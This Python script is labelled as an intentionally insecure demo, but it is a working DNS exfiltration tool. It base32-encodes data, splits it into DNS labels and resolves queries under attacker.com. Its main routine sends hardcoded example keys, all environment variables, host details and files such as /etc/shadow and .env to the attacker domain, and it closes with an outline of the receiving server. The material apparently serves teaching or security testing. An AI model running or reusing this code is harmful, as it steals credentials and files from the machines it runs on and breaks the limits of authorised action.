#!/usr/bin/env python3

# VULNERABILITY: DNS Exfiltration
# This script demonstrates how secrets can be exfiltrated over DNS queries
# INTENTIONALLY INSECURE FOR DEMO - Do not use in production!

import socket
import base64
import time
import sys
import os

# VULNERABLE: Hardcoded secrets for demonstration
SECRETS = {
    "aws_key": "AKIAIOSFODNN7EXAMPLE",
    "aws_secret": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
    "api_key": "sk_test_51H1234567890abcdefghijklmnopqrstuvwxyz",
    "database_password": "super_secret_db_password_123",
    "jwt_secret": "my_super_secret_jwt_key_12345"
}

def encode_secret(secret):
    """VULNERABLE: Encode secret using base32 for DNS exfiltration"""
    # VULNERABLE: Using base32 encoding which is DNS-safe
    # VULNERABLE: No encryption or obfuscation
    encoded = base64.b32encode(secret.encode()).decode()
    return encoded

def chunk_data(data, chunk_size=63):
    """VULNERABLE: Split data into DNS-safe chunks"""
    # VULNERABLE: DNS labels limited to 63 characters
    # VULNERABLE: No additional obfuscation
    chunks = []
    for i in range(0, len(data), chunk_size):
        chunk = data[i:i+chunk_size]
        chunks.append(chunk)
    return chunks

def exfiltrate_secret(secret_name, secret_value, domain="attacker.com"):
    """VULNERABLE: Exfiltrate secret via DNS queries"""
    print(f"[+] Exfiltrating {secret_name}...")
    
    # VULNERABLE: Encode secret without encryption
    encoded_secret = encode_secret(secret_value)
    print(f"[+] Encoded secret: {encoded_secret}")
    
    # VULNERABLE: Split into DNS-safe chunks
    chunks = chunk_data(encoded_secret)
    print(f"[+] Split into {len(chunks)} chunks")
    
    # VULNERABLE: Send each chunk as DNS query
    for i, chunk in enumerate(chunks):
        # VULNERABLE: Construct DNS query with secret data
        dns_query = f"{chunk}.{i}.{secret_name}.{domain}"
        print(f"[+] DNS Query {i+1}: {dns_query}")
        
        try:
            # VULNERABLE: Resolve DNS query (sends data to attacker)
            ip = socket.gethostbyname(dns_query)
            print(f"[+] Resolved to: {ip}")
        except socket.gaierror as e:
            print(f"[!] DNS resolution failed: {e}")
        
        # VULNERABLE: Small delay to avoid rate limiting
        time.sleep(0.1)

def exfiltrate_file(file_path, domain="attacker.com"):
    """VULNERABLE: Exfiltrate file contents via DNS"""
    print(f"[+] Exfiltrating file: {file_path}")
    
    try:
        with open(file_path, 'rb') as f:
            file_data = f.read()
        
        # VULNERABLE: Encode file data without encryption
        encoded_data = base64.b32encode(file_data).decode()
        print(f"[+] Encoded file data: {encoded_data[:100]}...")
        
        # VULNERABLE: Split into chunks and exfiltrate
        chunks = chunk_data(encoded_data)
        print(f"[+] Split into {len(chunks)} chunks")
        
        for i, chunk in enumerate(chunks):
            dns_query = f"{chunk}.{i}.file.{os.path.basename(file_path)}.{domain}"
            print(f"[+] DNS Query {i+1}: {dns_query}")
            
            try:
                ip = socket.gethostbyname(dns_query)
                print(f"[+] Resolved to: {ip}")
            except socket.gaierror as e:
                print(f"[!] DNS resolution failed: {e}")
            
            time.sleep(0.1)
            
    except FileNotFoundError:
        print(f"[!] File not found: {file_path}")
    except Exception as e:
        print(f"[!] Error reading file: {e}")

def exfiltrate_environment_variables(domain="attacker.com"):
    """VULNERABLE: Exfiltrate environment variables via DNS"""
    print("[+] Exfiltrating environment variables...")
    
    # VULNERABLE: Get all environment variables
    env_vars = dict(os.environ)
    
    for var_name, var_value in env_vars.items():
        if var_value:  # Only exfiltrate non-empty values
            print(f"[+] Exfiltrating env var: {var_name}")
            exfiltrate_secret(var_name, var_value, domain)

def exfiltrate_system_info(domain="attacker.com"):
    """VULNERABLE: Exfiltrate system information via DNS"""
    print("[+] Exfiltrating system information...")
    
    # VULNERABLE: Collect system information
    system_info = {
        "hostname": socket.gethostname(),
        "username": os.getenv("USER", "unknown"),
        "home_dir": os.getenv("HOME", "unknown"),
        "current_dir": os.getcwd(),
        "python_version": sys.version,
        "platform": sys.platform
    }
    
    for info_name, info_value in system_info.items():
        print(f"[+] Exfiltrating system info: {info_name}")
        exfiltrate_secret(info_name, str(info_value), domain)

def main():
    print("=== DNS Exfiltration Demo ===")
    print("WARNING: This script is INTENTIONALLY INSECURE FOR DEMO!")
    print("Do not use this in production!")
    print()
    
    # VULNERABLE: Attacker-controlled domain
    attacker_domain = "attacker.com"
    
    print("1. Exfiltrating hardcoded secrets...")
    for secret_name, secret_value in SECRETS.items():
        exfiltrate_secret(secret_name, secret_value, attacker_domain)
        print()
    
    print("2. Exfiltrating environment variables...")
    exfiltrate_environment_variables(attacker_domain)
    print()
    
    print("3. Exfiltrating system information...")
    exfiltrate_system_info(attacker_domain)
    print()
    
    # VULNERABLE: Check for sensitive files to exfiltrate
    sensitive_files = [
        "/etc/passwd",
        "/etc/shadow",
        ".env",
        "config.json",
        "secrets.txt"
    ]
    
    print("4. Attempting to exfiltrate sensitive files...")
    for file_path in sensitive_files:
        if os.path.exists(file_path):
            exfiltrate_file(file_path, attacker_domain)
            print()
    
    print("=== DNS Exfiltration Complete ===")
    print("VULNERABILITY: All data was sent to attacker's DNS server!")
    print("Attacker can reconstruct data from DNS queries.")

# VULNERABLE: Example of how attacker would receive data
def attacker_dns_server_example():
    """
    VULNERABLE: Example of how attacker's DNS server would receive data
    
    Attacker would run a DNS server that:
    1. Receives DNS queries containing encoded data
    2. Extracts the encoded data from subdomain
    3. Decodes and reconstructs the original data
    4. Stores the exfiltrated information
    """
    print("Attacker DNS Server Example:")
    print("1. DNS Query: ABC123.0.aws_key.attacker.com")
    print("2. Extract: ABC123")
    print("3. Decode: base32_decode('ABC123')")
    print("4. Reconstruct: Combine all chunks")
    print("5. Result: Original secret value")

if __name__ == "__main__":
    main()
    
    print("\n" + "="*50)
    attacker_dns_server_example()